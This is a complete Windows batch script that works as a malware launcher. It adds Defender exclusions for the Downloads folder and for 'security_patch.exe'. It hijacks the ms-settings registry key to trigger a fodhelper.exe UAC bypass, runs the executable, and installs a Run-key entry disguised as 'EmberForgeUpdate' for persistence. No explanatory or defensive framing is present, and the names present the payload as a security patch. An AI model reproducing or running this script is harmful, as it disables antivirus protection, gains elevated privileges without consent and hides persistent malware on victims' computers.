@echo off
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\%USERNAME%\Downloads'"
powershell -Command "Add-MpPreference -ExclusionProcess 'security_patch.exe'"
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "C:\Users\%USERNAME%\Downloads\security_patch.exe" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_DWORD /d 0 /f
start fodhelper.exe
start C:\Users\%USERNAME%\Downloads\security_patch.exe
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EmberForgeUpdate" /t REG_SZ /d "C:\Users\%USERNAME%\Downloads\security_patch.exe" /f